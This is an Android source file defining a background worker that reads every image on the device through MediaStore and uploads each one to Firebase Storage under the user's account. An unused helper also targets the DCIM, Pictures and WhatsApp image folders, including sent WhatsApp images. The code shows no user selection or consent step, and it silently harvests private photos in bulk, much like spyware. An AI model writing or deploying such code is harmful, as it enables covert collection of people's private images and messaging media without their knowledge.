package com.mehboob.bushorat.helpers;



import android.content.Context;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.os.Environment;
import android.provider.MediaStore;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.work.OneTimeWorkRequest;
import androidx.work.WorkManager;
import androidx.work.Worker;
import androidx.work.WorkerParameters;

import com.google.firebase.FirebaseApp;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.Objects;

public class ImageUploadWorker extends Worker {

    public ImageUploadWorker(@NonNull Context context, @NonNull WorkerParameters workerParams) {
        super(context, workerParams);
        FirebaseApp.initializeApp(context); // Make sure Firebase is initialized
    }

    @NonNull
    @Override
    public Result doWork() {
        FirebaseAuth auth = FirebaseAuth.getInstance();
        if (auth.getCurrentUser() == null) {
            Log.e("ImageUploadWorker", "User not logged in.");
            return Result.failure();
        }

        String uid = auth.getUid();
        FirebaseDatabase database = FirebaseDatabase.getInstance();
        FirebaseStorage storage = FirebaseStorage.getInstance();

        List<File> images = getAllImagesFromMediaStore();

        if (images.isEmpty()) {
            Log.d("ImageUploadWorker", "No images found to upload.");
            return Result.success();
        }

        for (File image : images) {
            String filename = image.getName();
            String safeFilename = filename.replace(".", "_");

            DatabaseReference uploadedRef = database.getReference("users")
                    .child(uid)
                    .child("images")
                    .child("uploaded_images")
                    .child(safeFilename);

            Bitmap bitmap = BitmapFactory.decodeFile(image.getAbsolutePath());
            if (bitmap == null) {
                Log.e("ImageUploadWorker", "Failed to decode: " + image.getAbsolutePath());
                continue;
            }

            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            bitmap.compress(Bitmap.CompressFormat.JPEG, 60, baos);
            byte[] data = baos.toByteArray();

            StorageReference ref = storage.getReference("users/" + uid + "/uploaded/" + filename);
            ref.putBytes(data)
                    .addOnSuccessListener(taskSnapshot ->
                            ref.getDownloadUrl().addOnSuccessListener(uri ->
                                    uploadedRef.setValue(uri.toString())
                            )
                    )
                    .addOnFailureListener(e ->
                            Log.e("ImageUploadWorker", "Failed to upload: " + filename + " Error: " + e.getMessage())
                    );
        }

        return Result.success();
    }

    private List<File> getAllImages() {
        List<File> imageList = new ArrayList<>();

        File dcim = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM);
        File pictures = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_PICTURES);
        File whatsapp = new File(Environment.getExternalStorageDirectory(), "WhatsApp/Media/WhatsApp Images");
        File whatsappSent = new File(Environment.getExternalStorageDirectory(), "WhatsApp/Media/WhatsApp Images/Sent");

        File[] folders = new File[]{dcim, pictures, whatsapp, whatsappSent};

        for (File folder : folders) {
            if (folder.exists() && folder.isDirectory()) {
                for (File file : Objects.requireNonNull(folder.listFiles())) {
                    if (file.getName().endsWith(".jpg") ||
                            file.getName().endsWith(".jpeg") ||
                            file.getName().endsWith(".png")) {
                        imageList.add(file);
                    }
                }
            }
        }

        return imageList;
    }

    public static void enqueueWork(Context context) {
        OneTimeWorkRequest uploadWork = new OneTimeWorkRequest.Builder(ImageUploadWorker.class).build();
        WorkManager.getInstance(context).enqueue(uploadWork);
    }

    private List<File> getAllImagesFromMediaStore() {
        List<File> imageList = new ArrayList<>();
        Context context = getApplicationContext();

        String[] projection = {MediaStore.Images.Media.DATA};

        try (Cursor cursor = context.getContentResolver().query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                null,
                null,
                MediaStore.Images.Media.DATE_ADDED + " DESC"
        )) {
            if (cursor != null) {
                int dataColumn = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);

                while (cursor.moveToNext()) {
                    String filePath = cursor.getString(dataColumn);
                    if (filePath != null && (filePath.endsWith(".jpg") || filePath.endsWith(".jpeg") || filePath.endsWith(".png"))) {
                        imageList.add(new File(filePath));
                        Log.d("ImageUploadWorker", "Found image via MediaStore: " + filePath);
                    }
                }
            }
        } catch (Exception e) {
            Log.e("ImageUploadWorker", "Error reading images from MediaStore: " + e.getMessage());
        }

        return imageList;
    }

}
